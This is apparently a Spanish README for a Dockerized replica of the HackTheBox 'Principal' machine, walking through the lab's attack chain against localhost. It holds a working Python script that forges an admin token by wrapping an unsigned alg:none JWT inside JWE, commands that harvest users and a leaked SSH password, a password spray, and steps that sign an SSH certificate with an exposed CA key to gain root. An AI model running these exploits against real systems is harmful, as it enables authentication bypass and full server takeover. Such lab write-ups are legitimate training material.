# Principal HTB - Docker Machine

## Despliegue

```bash
# Construir
sh start.sh
```

## Acceso
- Web: http://localhost:8182
- SSH: localhost:2222

---

## Vulnerabilidades reproducidas

### 1. Foothold - CVE-2026-29000: JWE + PlainJWT bypass

**Teoría:** El servidor acepta tokens JWE. Al desencriptar, extrae el JWT interior.
Si ese JWT tiene `alg: none` (PlainJWT), el verificador devuelve `null` para `signedJWT`
y el bloque `if (signedJWT != null)` salta la verificación de firma por completo.

**Exploit script (`exploit_jwt.py`):**
(Presente en items/principal_script.py)
```python
#!/usr/bin/env python3
import json, time, base64, requests, sys
from jwcrypto import jwk, jwe

TARGET = sys.argv[1]  # e.g. http://localhost:8080

# 1. Obtener clave pública RSA del endpoint JWKS
resp = requests.get(f"{TARGET}/api/auth/jwks")
key_data = resp.json()['keys'][0]
pub_key = jwk.JWK(**key_data)

# 2. Construir PlainJWT con claims de admin
def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = int(time.time())
header  = b64url(json.dumps({"alg": "none"}).encode())
payload = b64url(json.dumps({
    "sub": "admin", "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now, "exp": now + 3600
}).encode())
plain_jwt = f"{header}.{payload}."

# 3. Envolver en JWE cifrado con la clave pública del servidor
jwe_token = jwe.JWE(
    plain_jwt.encode(),
    recipient=pub_key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256", "enc": "A128GCM",
        "kid": key_data['kid'], "cty": "JWT"
    })
)
forged = jwe_token.serialize(compact=True)

# 4. Usar el token forjado
headers = {"Authorization": f"Bearer {forged}"}
r = requests.get(f"{TARGET}/api/dashboard", headers=headers)
data = r.json()
print(f"[+] Autenticado como: {data['user']['username']} ({data['user']['role']})")
print(f"[+] Token: {forged}")
```

```bash
pip install jwcrypto requests
python3 principal_script.py http://localhost:8182
```

**Obtener credenciales SSH:**  
a) Con el navegador (Application → Session storage → http://localhost:8182):
Key: auth_token
Value: token

Accedemos a /dashboard, donde podemos ver que también tenemos disponible users (de aquí sacamos diccionario de usuarios) y Settings (encontramos encryptionKey)

b) Con curl

Diccionario de usuarios:
```bash
curl -H "Authorization: Bearer <TOKEN>" http://localhost:8182/api/users | python3 -m json.tool
# → encryptionKey: D3pl0y_$$H_Now42!
```
Contraseña:
```bash
curl -H "Authorization: Bearer <TOKEN>" http://localhost:8182/api/settings | python3 -m json.tool
# → encryptionKey: D3pl0y_$$H_Now42!
```

**Password spray en SSH:**

Una vez tenemos un diccionario de posibles usuarios (items/users.txt) y una posible contraseña, usamos una herramienta como ghidra o nxc para llevar a cabo un password spray.
Vemos que, por suerte, esa contraseña nos sirve para el usuario svc-deploy

```bash
ssh svc-deploy@localhost -p 2222   # D3pl0y_$$H_Now42!
```
Podemos encontrar la flag de usuario en user.txt (/home/svc-deploy)

---

### 2. Privilege Escalation - SSH CA Certificate Forgery

**Teoría:** El servidor confía en cualquier certificado firmado por la CA local (`TrustedUserCAKeys`).
Sin `AuthorizedPrincipalsFile`, solo comprueba que el certificado esté firmado por la CA — no
valida el campo *principal* (usuario). Como `svc-deploy` puede leer la clave privada de la CA,
podemos forjar un certificado que declare `root` como principal.

```bash
# Como svc-deploy en la máquina:

# 1. Verificar acceso a la CA
ls -la /opt/principal/ssh/
cat /opt/principal/ssh/README.txt

# 2. Verificar config sshd vulnerable
cat /etc/ssh/sshd_config.d/60-principal.conf
# → TrustedUserCAKeys /opt/principal/ssh/ca.pub
# → NO hay AuthorizedPrincipalsFile

# 3. Generar nuevo par de claves
ssh-keygen -t ed25519 -f /tmp/pwn -N ""

# 4. Firmar con la CA, especificando root como principal
ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub

# 5. Verificar el certificado
ssh-keygen -L -f /tmp/pwn-cert.pub
# → Principals: root

# 6. Conectar como root
ssh -i /tmp/pwn root@localhost

# 7. Flag root
cat /root/root.txt
```

---

## Flags
- User flag: `/home/svc-deploy/user.txt`
- Root flag: `/root/root.txt`

## Clean
Al terminar borrar el contenedor 
```bash
sh clean.sh
```
